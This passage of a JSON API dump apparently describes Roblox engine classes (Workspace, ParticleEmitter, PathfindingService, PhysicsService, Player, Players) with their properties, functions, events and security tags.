ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null},{"Type":"JointCreationMode","Name":"jointType","Default":null}],"Name":"JoinToOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"MakeJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"PGSIsEnabled","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetPhysicsThrottleEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"UnjoinFromOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ZoomToExtents","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendantsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"findPartOnRay","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendantsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"findPartsInRegion3","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"Arguments":[{"Name":"count","Type":"int"}],"Name":"PhysicsAnalyzerIssuesFound","tags":["PluginSecurity"],"Class":"Workspace","type":"Event"},{"Superclass":"Model","type":"Class","Name":"Status","tags":["deprecated","notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Pages","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsFinished","tags":["readonly"],"Class":"Pages"},{"ReturnType":"Array","Arguments":[],"Name":"GetCurrentPage","tags":[],"Class":"Pages","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"AdvanceToNextPageAsync","tags":[],"Class":"Pages","type":"YieldFunction"},{"Superclass":"Pages","type":"Class","Name":"DataStorePages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"FriendPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"InventoryPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"StandardPages","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PartOperationAsset","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ParticleEmitter","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Acceleration","tags":[],"Class":"ParticleEmitter"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Drag","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NormalId","type":"Property","Name":"EmissionDirection","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Lifetime","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightInfluence","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"LockedToPart","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"RotSpeed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Rotation","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Size","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Speed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Vector2","type":"Property","Name":"SpreadAngle","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocityInheritance","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocitySpread","tags":["deprecated"],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"ParticleEmitter"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"ParticleEmitter","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"particleCount","Default":"16"}],"Name":"Emit","tags":[],"Class":"ParticleEmitter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Path","tags":[]},{"ValueType":"PathStatus","type":"Property","Name":"Status","tags":["readonly"],"Class":"Path"},{"ReturnType":"Array","Arguments":[],"Name":"GetPointCoordinates","tags":["deprecated"],"Class":"Path","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetWaypoints","tags":[],"Class":"Path","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"start","Default":null}],"Name":"CheckOcclusionAsync","tags":[],"Class":"Path","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PathWaypoint","tags":[]},{"ValueType":"PathWaypointAction","type":"Property","Name":"Action","tags":["readonly"],"Class":"PathWaypoint"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":["readonly"],"Class":"PathWaypoint"},{"Superclass":"Instance","type":"Class","Name":"PathfindingService","tags":["notCreatable"]},{"ValueType":"float","type":"Property","Name":"EmptyCutoff","tags":["deprecated"],"Class":"PathfindingService"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeRawPathAsync","tags":["deprecated"],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeSmoothPathAsync","tags":["deprecated"],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null}],"Name":"FindPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PersonalServerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsService","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"part","Default":null}],"Name":"CollisionGroupContainsPart","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name1","Default":null},{"Type":"string","Name":"name2","Default":null},{"Type":"bool","Name":"collidable","Default":null}],"Name":"CollisionGroupSetCollidable","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name1","Default":null},{"Type":"string","Name":"name2","Default":null}],"Name":"CollisionGroupsAreCollidable","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateCollisionGroup","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetCollisionGroupId","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"name","Default":null}],"Name":"GetCollisionGroupName","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetCollisionGroups","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxCollisionGroups","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"RemoveCollisionGroup","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"from","Default":null},{"Type":"string","Name":"to","Default":null}],"Name":"RenameCollisionGroup","tags":[],"Class":"PhysicsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"part","Default":null},{"Type":"string","Name":"name","Default":null}],"Name":"SetPartCollisionGroup","tags":[],"Class":"PhysicsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PhysicsSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowSleep","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAnchorsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAssembliesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAwakePartsHighlighted","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreBodyTypesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactIslandsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactPointsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreJointCoordinatesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreMechanismsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreModelCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreOwnersShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ArePartCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreRegionsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreUnalignedPartsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreWorldCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"DisableCSGv2","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsReceiveAgeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsTreeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ParallelPhysics","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"PhysicsAnalyzerEnabled","tags":["PluginSecurity","readonly"],"Class":"PhysicsSettings"},{"ValueType":"EnviromentalPhysicsThrottle","type":"Property","Name":"PhysicsEnvironmentalThrottle","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ShowDecompositionGeometry","tags":[],"Class":"PhysicsSettings"},{"ValueType":"double","type":"Property","Name":"ThrottleAdjustTime","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"UseCSGv2","tags":[],"Class":"PhysicsSettings"},{"Superclass":"Instance","type":"Class","Name":"Player","tags":[]},{"ValueType":"int","type":"Property","Name":"AccountAge","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AppearanceDidLoad","tags":["RobloxScriptSecurity","deprecated","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"Player"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"CanLoadCharacterAppearance","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Character","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"CharacterAppearance","tags":["deprecated","notbrowsable"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"CharacterAppearanceId","tags":[],"Class":"Player"},{"ValueType":"ChatMode","type":"Property","Name":"ChatMode","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexity","tags":["deprecated","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexityLimit","tags":["LocalUserSecurity","deprecated"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DataReady","tags":["deprecated","readonly"],"Class":"Player"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DevEnableMouseLock","tags":[],"Class":"Player"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"DisplayName","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"FollowUserId","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Guest","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"MaximumSimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"MembershipType","type":"Property","Name":"MembershipType","tags":["readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"ReplicationFocus","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"RespawnLocation","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"SimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Team","tags":[],"Class":"Player"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Teleported","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"TeleportedIn","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"UserId","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"VRDevice","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"userId","tags":["deprecated"],"Class":"Player"},{"ReturnType":"void","Arguments":[],"Name":"ClearCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"float","Arguments":[{"Type":"Vector3","Name":"point","Default":null}],"Name":"DistanceFromCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"FriendStatus","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"GetFriendStatus","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetGameSessionID","tags":["RobloxSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUnder13","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HasAppearanceLoaded","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsUserAvailableForExperiment","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"JumpCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Kick","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"assetInstance","Default":null}],"Name":"LoadCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadData","tags":["LocalUserSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"walkDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"walkDirection","Default":null},{"Type":"float","Name":"maxWalkDelta","Default":null}],"Name":"MoveCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveCharacter","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RequestFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RevokeFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SaveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveData","tags":["LocalUserSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"SaveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"SaveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SaveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"accountAge","Default":null}],"Name":"SetAccountAge","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"MembershipType","Name":"membershipType","Default":null}],"Name":"SetMembershipType","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetSuperSafeChat","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetUnder13","tags":["RobloxSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"saveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"saveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"saveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"saveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"maxFriends","Default":"200"}],"Name":"GetFriendsOnline","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRankInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRoleInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsBestFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsFriendsWith","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"IsInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"LoadCharacter","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"LoadCharacterBlocking","tags":["LocalUserSecurity"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"WaitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"isFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"waitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAdded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAppearanceLoaded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterRemoving","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"recipient","Type":"Instance"}],"Name":"Chatted","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"friendStatus","Type":"FriendStatus"}],"Name":"FriendStatusChanged","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"}],"Name":"Idled","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"teleportState","Type":"TeleportState"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"OnTeleport","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"radius","Type":"float"}],"Name":"SimulationRadiusChanged","tags":["LocalUserSecurity"],"Class":"Player","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PlayerScripts","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearComputerCameraMovementModes","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearComputerMovementModes","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearTouchCameraMovementModes","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearTouchMovementModes","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetRegisteredComputerCameraMovementModes","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetRegisteredComputerMovementModes","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetRegisteredTouchCameraMovementModes","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetRegisteredTouchMovementModes","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ComputerCameraMovementMode","Name":"cameraMovementMode","Default":null}],"Name":"RegisterComputerCameraMovementMode","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ComputerMovementMode","Name":"movementMode","Default":null}],"Name":"RegisterComputerMovementMode","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"TouchCameraMovementMode","Name":"cameraMovementMode","Default":null}],"Name":"RegisterTouchCameraMovementMode","tags":[],"Class":"PlayerScripts","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"TouchMovementMode","Name":"movementMode","Default":null}],"Name":"RegisterTouchMovementMode","tags":[],"Class":"PlayerScripts","type":"Function"},{"Arguments":[],"Name":"ComputerCameraMovementModeRegistered","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Event"},{"Arguments":[],"Name":"ComputerMovementModeRegistered","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Event"},{"Arguments":[],"Name":"TouchCameraMovementModeRegistered","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Event"},{"Arguments":[],"Name":"TouchMovementModeRegistered","tags":["RobloxScriptSecurity"],"Class":"PlayerScripts","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Players","tags":[]},{"ValueType":"bool","type":"Property","Name":"BubbleChat","tags":["readonly"],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"CharacterAutoLoads","tags":[],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"ClassicChat","tags":["readonly"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"LocalPlayer","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"NumPlayers","tags":["deprecated","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"localPlayer","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"numPlayers","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"Chat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"CreateLocalPlayer","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerByUserId","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"GetPlayerFromCharacter","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"reason","Default":null},{"Type":"string","Name":"optionalMessage","Default":null}],"Name":"ReportAbuse","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ChatStyle","Name":"style","Default":"Classic"}],"Name":"SetChatStyle","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"TeamChat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null},{"Type":"Instance","Name":"player","Default":null}],"Name":"WhisperChat","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"getPlayerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getPlayers","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"playerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"players","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments"